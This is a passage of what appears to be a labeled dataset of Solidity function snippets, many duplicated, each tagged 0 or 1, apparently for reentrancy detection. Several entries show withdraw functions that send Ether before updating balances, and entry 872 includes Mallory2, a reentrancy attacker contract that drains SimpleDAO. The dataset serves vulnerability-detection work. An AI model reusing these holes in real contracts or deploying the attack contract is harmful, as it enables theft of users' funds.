EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
847 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
848 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
849 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
850 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
851 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
852 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
853 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
854 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
855 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
856 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
857 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
858 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
859 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
860 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
861 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
862 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
863 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
864 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
865 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
866 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
867 40241.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
868 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
869 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
870 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
871 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
872 SimpleDAO.sol
function withdraw(uint amount) {
if (credit[msg.sender]>= amount) {
msg.sender.call.value(amount)();
credit[msg.sender]-=amount;
function getJackpot() {
owner.send(this.balance);
function() {
dao.withdraw(dao.queryCredit(this));
contract Mallory2 {
SimpleDAO public dao;
address owner;
bool public performAttack = true;
function attack()  {
dao.donate.value(1)(this);
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
1
---------------------------------
873 32605.sol
function forward(address destination, uint value, bytes data) public onlyOwner {
require(destination.call.value(value)(data));
Forwarded(destination, value, data);
contract MetaIdentityManager {
uint adminTimeLock;
uint userTimeLock;
uint adminRate;
address relay;
event LogIdentityCreated(address indexed identity, address indexed creator, address owner, address indexed recoveryKey);
event LogOwnerAdded(address indexed identity, address indexed owner, address instigator);
event LogOwnerRemoved(address indexed identity, address indexed owner, address instigator);
event LogRecoveryChanged(address indexed identity, address indexed recoveryKey,address instigator);
event LogMigrationInitiated(address indexed identity, address indexed newIdManager, address instigator);
event LogMigrationCanceled(address indexed identity, address indexed newIdManager, address instigator);
event LogMigrationFinalized(address indexed identity, address indexed newIdManager, address instigator);
mapping(address => mapping(address => uint)) owners;
mapping(address => address) recoveryKeys;
mapping(address => mapping(address => uint)) limiter;
mapping(address => uint) public migrationInitiated;
mapping(address => address) public migrationNewAddress;
modifier onlyAuthorized() {
require(msg.sender == relay || checkMessageData(msg.sender));
modifier onlyOwner(address identity, address sender) {
require(isOwner(identity, sender));
modifier onlyOlderOwner(address identity, address sender) {
require(isOlderOwner(identity, sender));
modifier onlyRecovery(address identity, address sender) {
require(recoveryKeys[identity] == sender);
modifier rateLimited(Proxy identity, address sender) {
require(limiter[identity][sender] < (now - adminRate));
limiter[identity][sender] = now;
modifier validAddress(address addr) {
require(addr != address(0));
function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) {
Proxy identity = new Proxy();
owners[identity][owner] = now - adminTimeLock;
recoveryKeys[identity] = recoveryKey;
LogIdentityCreated(identity, msg.sender, owner,  recoveryKey);
identity.forward(destination, 0, data);
function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){
identity.forward(destination, value, data);
0
---------------------------------
874 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
875 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
876 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
877 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
878 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
879 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
880 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
881 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
882 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
883 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
884 18170.sol
function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() {
require(_amount <= wingsETHRewards);
require(_contract.call.value(_amount)());
wingsETHRewards -= _amount;
0
---------------------------------
885 Reentrance_01.sol
function withdrawBalance(){
if(!(msg.sender.call.value(userBalance[msg.sender])())){ throw; }
userBalance[msg.sender] = 0;
1
---------------------------------
886 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
887 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
888 25808.sol
function getTokens(uint num, address addr) public {
for(uint i = 0; i < num; i++){
addr.call.value(0 wei)();
1
---------------------------------
889 Victim.sol
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
balances[msg.sender] -= _amount;
1
---------------------------------
890 1751.sol
function proxy(address target, bytes data) public payable {
target.call.value(msg.value)(data);
contract VaultProxy is Proxy {
address public Owner;
mapping (address => uint256) public Deposits;
0
---------------------------------
891 14579.sol
function pay() public onlyOwner whenNotCanceled {
require(weiCollected > 0);
uint256 fee;
uint256 netAmount;
(fee, netAmount) = _getFeeAndNetAmount(weiCollected);
require(address(sale).call.value(netAmount)(this));
tokensReceived = getToken().balanceOf(this);
if (fee != 0) {
manager.transfer(fee);
paid = true;
emit Paid(netAmount, fee);
0
---------------------------------
892 18425.sol
function payout() public {
uint balance = address(this).balance;
require(balance > 1);
uint investment = balance / 2;
balance =- investment;
flmContract.call.value(investment).gas(1000000)();
while (balance > 0) {
uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
if(payoutToSend > 0){
participants[payoutOrder].payout -= payoutToSend;
balance -= payoutToSend;
if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
if(balance > 0){
payoutOrder += 1;
function payout() public {
uint balance = address(this).balance;
require(balance > 1);
uint investment = balance / 2;
balance =- investment;
flmContract.call.value(investment).gas(1000000)();
while (balance > 0) {
uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
if(payoutToSend > 0){
participants[payoutOrder].payout -= payoutToSend;
balance -= payoutToSend;
if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
if(balance > 0){
payoutOrder += 1;
0
---------------------------------
893 15458.sol
function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) {
_transfer( msg.sender, to, value, data )
require(address(to).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data));
return true;
function transfer(address to, uint256 value) public  returns (bool success)  {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
return true;
function transferFrom(address from, address to, uint256 value) public returns (bool success) {
require(value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer(from, to, value, empty);
return true;
function transfer(address to, uint value, bytes data ) public  returns (bool success)  {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer( msg.sender, to, value, data );
return true;
function transferToContract(address to, uint value, bytes data) private  returns (bool success)  {
_transfer( msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
if (isContract(rx)) {
rx.tokenFallback( msg.sender, value, data );
return true;
return false;
1
---------------------------------
894 27398.sol
function Command(address adr,bytes data) payable public {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
895 36732.sol
function claim_bounty(){
